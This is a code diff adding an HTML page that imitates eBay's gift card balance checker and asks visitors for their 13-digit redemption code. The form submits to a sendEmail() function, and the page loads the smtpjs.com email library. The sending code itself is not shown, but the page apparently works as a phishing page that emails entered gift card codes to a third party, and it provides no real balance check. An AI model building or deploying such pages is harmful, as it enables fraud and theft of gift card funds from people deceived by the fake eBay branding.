@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Ebay - Check balance</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="header">
+        <img class="ebay-logo" src="ebay-logo.png" alt="">
+    </div>
+    <hr>
+    <div class="second-div">
+        <h3>Check your ebay Gift Card balance</h3>
+        <div>
+            <img class="ebay-big" src="ebay-big.png" alt="">
+        </div>   
+    </div>
+    <div class="form">
+        <h3 id="opps"></h3>
+        <form onsubmit="sendEmail();" >
+          <label for="enter-code"> Enter your 13 digits redemption code <span class="enter-code-span"> * </span> </label>
+          <input type="text" placeholder="XXX-XXX-XXX-XXXX" id="enter-code" aria-required="true" aria-invalid="true">
+          <span class="aria" aria-hidden="true"> code is required to check balance</span>
+          <button type="submit"> Check balance</button>
+        </form>
+    </div>
+    <p> Your gift card balance never expires and is non-transferrable after first use. Read the full <span class="p-span">terms and conditions. </span> </p>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script src="index.js"></script>
+</body>
+</html>
